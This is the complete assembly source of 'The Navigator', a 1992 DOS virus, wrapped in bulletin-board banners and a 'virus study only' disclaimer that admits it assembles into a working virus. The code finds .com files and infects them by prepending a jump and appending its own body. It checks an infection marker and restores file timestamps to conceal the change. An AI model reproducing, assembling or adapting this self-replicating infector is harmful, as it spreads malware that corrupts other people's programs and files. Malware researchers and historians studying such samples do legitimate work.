;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;****************************************************************************
;*   The Navigator							    *
;*  									    *
;*   Assembled with Tasm 2.5						    *
;*								            *
;*   (c) 1992 Dark Helmet, The Netherlands				    *
;*   The author takes no responsibilty for any damages caused by the virus  *
;*									    *
;*   Special greetings to : 						    *
;*   Glenn Benton, XSTC for their nice source and viruses, 		    *
;*   Peter Venkman for his BBS, Marcel and Ziggy for keeping me of the      *
;*   work, Guns and Roses for their great music, 			    *
;*   and al the other viruswriters...					    *
;*									    *
;*   " Trust me...I know what I'm doing"				    *
;*									    *
;*--------------------------------------------------------------------------*
;*									    *
;*   Coming soon : The Anti-DAF Virus  					    *
;*                 Civil War II 				 	    *
;*					   				    *
;*--------------------------------------------------------------------------*
;*									    *
;*    Used Books : - MSDOS voor gevorderen (tweede editie)		    *
;*	             Ray Duncan, ISBN 90 201 2299 1 (660 blz.)	  	    *
;*                 - PC Handboek voor programmeurs			    *
;*                   Robert Jourdain, ISBN 90 6233 443 1 (542 blz.)	    *
;*		   - Werken met Turbo Assembler				    *
;*		     Tom Swam, ISBN 90 6233 627 2 (903 blz.)  		    *
;*									    *
;****************************************************************************

		.Radix 16

Navigator	Segment
		Assume cs:Navigator, ds:Navigator, 
		org 100h

len 		equ offset last - begin

Dummy:          db 0e9h, 03h, 00h, 44h, 48h, 00h

Begin:          call virus

Virus:          pop bp
                sub bp,109h
                mov dx,0fe00h
                mov ah,1ah
                int 21h
		
Restore_begin:  mov di,0100h
		lea si,ds:[buffer+bp]
		mov cx,06h
		rep movsb
				
First:		lea dx,[com_mask+bp]
		mov ah,04eh
		xor cx,cx
		int 21h

Open_file:	mov ax,03d02h
		mov dx,0fe1eh
		int 21h
		mov [handle+bp],ax
		xchg ax,bx

Read_date:	mov ax,05700h
		int 21h
		mov [date+bp],dx
		mov [time+bp],cx

Check_infect:	mov bx,[handle+bp]
		mov ah,03fh
		mov cx,06h
		lea dx,[buffer+bp]
		int 21h
                mov al,byte ptr [buffer+bp]+3
		mov ah,byte ptr [buffer+bp]+4 
		cmp ax,[initials+bp]
		jne infect_file

Close_file:     mov bx,[handle+bp]
		mov ah,3eh
		int 21h

Next_file:      mov ah,4fh
		int 21h
		jnb open_file
		jmp exit

Infect_file:    mov ax,word ptr [cs:0fe1ah]
		sub ax,03h
		mov [lenght+bp],ax
		mov ax,04200h
		call move_pointer
		
Write_jump:     mov ah,40h
		mov cx,01h
		lea dx,[jump+bp]
		int 21h
		mov ah,40h
		mov cx,02h
		lea dx,[lenght+bp]
		int 21h
		mov ah,40
		mov cx,02h
		lea dx,[initials+bp]
		int 21h

Write_virus:	mov ax,4202h
		call move_pointer
		mov ah,40h
		mov cx,len
		lea dx,[begin+bp]
		int 21h

restore_date:   mov dx,[date+bp]
		mov cx,[time+bp]
		mov bx,[handle+bp]
		mov ax,05701h
		int 21h

exit:		mov bx,0100h
		jmp bx

;----------------------------------------------------------------------------

move_pointer:   mov bx,[handle+bp]
		xor cx,cx
		xor dx,dx
		int 21h
		ret
		
;----------------------------------------------------------------------------

com_mask	db "*.com",0
handle		dw ?
date		dw ?
time		dw ?
buffer          db 090h,0cdh,020h,044h,048h,00h
initials        dw 4844h         
lenght		dw ?
jump            db 0e9h,0
msg             db "The Navigator, (c) 1992 Dark Helmet",0

last		db 090h

Navigator	ends
		end  dummy
;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

